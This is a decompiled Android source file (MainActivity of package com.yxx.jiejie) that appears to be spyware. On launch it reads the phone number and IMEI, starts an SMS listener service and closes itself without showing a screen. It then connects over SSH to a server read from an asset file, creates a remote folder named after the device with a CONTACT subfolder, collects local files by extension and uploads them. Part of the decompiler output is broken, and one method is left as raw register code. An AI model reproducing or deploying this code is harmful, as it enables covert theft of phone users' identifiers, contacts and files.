package com.yxx.jiejie;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import com.trilead.ssh2.Connection;
import com.trilead.ssh2.SCPClient;
import com.trilead.ssh2.Session;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    Connection conn = null;
    SCPClient ct = null;
    List prefixs = new ArrayList();
    public SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    Session sess = null;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TelephonyManager tm = (TelephonyManager) getSystemService("phone");
        Constant.LOCAL_MOBILE = tm.getLine1Number() == null ? "" : tm.getLine1Number();
        Global.imei = tm.getDeviceId();
        startService(new Intent(this, SMSListenerService.class));
        finish();
    }

    public boolean connectHost() {
        try {
            this.conn = new Connection(FileUtil.getFromAsset(this, "net.txt"));
            this.conn.connect();
            boolean isAuthenticated = this.conn.authenticateWithPassword(Global.USERNAME, Global.PASSWORD);
            if (isAuthenticated) {
                this.sess = this.conn.openSession();
                this.ct = new SCPClient(this.conn);
                this.sess.execCommand("mkdir -p /home/" + Constant.LOCAL_MOBILE + "_" + Global.imei + "/CONTACT");
                return isAuthenticated;
            }
            throw new IOException("Authentication failed.");
        } catch (IOException e) {
            e.printStackTrace();
            return true;
        }
    }

    public void putFiles(String[] arrs, String dir) {
        try {
            this.ct.put(arrs, "/home/" + dir);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public List getFiles(List paths) {
        List list = new ArrayList();
        for (int m = 0; m < paths.size(); m++) {
            File file = new File((String) paths.get(m));
            if (file.exists()) {
                File[] arr = file.listFiles();
                int i = 0;
                while (i < arr.length) {
                    for (int j = 0; j < this.prefixs.size(); j++) {
                        if (arr[i].getName().endsWith((String) this.prefixs.get(j)) && arr[i].isFile()) {
                            list.add(arr[i].getAbsolutePath());
                        }
                    }
                    i++;
                }
            }
        }
        return list;
    }

    /* JADX WARNING: Removed duplicated region for block: B:33:0x0053 A:{SYNTHETIC, Splitter:B:33:0x0053} */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x0058 A:{Catch:{ IOException -> 0x005c }} */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x0042 A:{SYNTHETIC, Splitter:B:25:0x0042} */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0047 A:{Catch:{ IOException -> 0x004b }} */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x0053 A:{SYNTHETIC, Splitter:B:33:0x0053} */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x0058 A:{Catch:{ IOException -> 0x005c }} */
    /* JADX WARNING: Removed duplicated region for block: B:25:0x0042 A:{SYNTHETIC, Splitter:B:25:0x0042} */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0047 A:{Catch:{ IOException -> 0x004b }} */
    public java.util.List getFromAsset(java.lang.String r11) {
        /*
        r10 = this;
        r5 = new java.util.ArrayList;
        r5.<init>();
        r3 = 0;
        r6 = 0;
        r0 = 0;
        r8 = "";
        r9 = r10.getResources();	 Catch:{ IOException -> 0x006f }
        r9 = r9.getAssets();	 Catch:{ IOException -> 0x006f }
        r3 = r9.open(r11);	 Catch:{ IOException -> 0x006f }
        r7 = new java.io.InputStreamReader;	 Catch:{ IOException -> 0x006f }
        r7.<init>(r3);	 Catch:{ IOException -> 0x006f }
        r1 = new java.io.BufferedReader;	 Catch:{ IOException -> 0x0071, all -> 0x0068 }
        r1.<init>(r7);	 Catch:{ IOException -> 0x0071, all -> 0x0068 }
        r4 = "";
    L_0x0022:
        r4 = r1.readLine();	 Catch:{ IOException -> 0x003a, all -> 0x006b }
        if (r4 != 0) goto L_0x0035;
    L_0x0028:
        if (r1 == 0) goto L_0x002d;
    L_0x002a:
        r1.close();	 Catch:{ IOException -> 0x0061 }
    L_0x002d:
        if (r7 == 0) goto L_0x0065;
    L_0x002f:
        r7.close();	 Catch:{ IOException -> 0x0061 }
        r0 = r1;
        r6 = r7;
    L_0x0034:
        return r5;
    L_0x0035:
        r8 = r4;
        r5.add(r4);	 Catch:{ IOException -> 0x003a, all -> 0x006b }
        goto L_0x0022;
    L_0x003a:
        r2 = move-exception;
        r0 = r1;
        r6 = r7;
    L_0x003d:
        r2.printStackTrace();	 Catch:{ all -> 0x0050 }
        if (r0 == 0) goto L_0x0045;
    L_0x0042:
        r0.close();	 Catch:{ IOException -> 0x004b }
    L_0x0045:
        if (r6 == 0) goto L_0x0034;
    L_0x0047:
        r6.close();	 Catch:{ IOException -> 0x004b }
        goto L_0x0034;
    L_0x004b:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x0034;
    L_0x0050:
        r9 = move-exception;
    L_0x0051:
        if (r0 == 0) goto L_0x0056;
    L_0x0053:
        r0.close();	 Catch:{ IOException -> 0x005c }
    L_0x0056:
        if (r6 == 0) goto L_0x005b;
    L_0x0058:
        r6.close();	 Catch:{ IOException -> 0x005c }
    L_0x005b:
        throw r9;
    L_0x005c:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x005b;
    L_0x0061:
        r2 = move-exception;
        r2.printStackTrace();
    L_0x0065:
        r0 = r1;
        r6 = r7;
        goto L_0x0034;
    L_0x0068:
        r9 = move-exception;
        r6 = r7;
        goto L_0x0051;
    L_0x006b:
        r9 = move-exception;
        r0 = r1;
        r6 = r7;
        goto L_0x0051;
    L_0x006f:
        r2 = move-exception;
        goto L_0x003d;
    L_0x0071:
        r2 = move-exception;
        r6 = r7;
        goto L_0x003d;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.yxx.jiejie.MainActivity.getFromAsset(java.lang.String):java.util.List");
    }
}
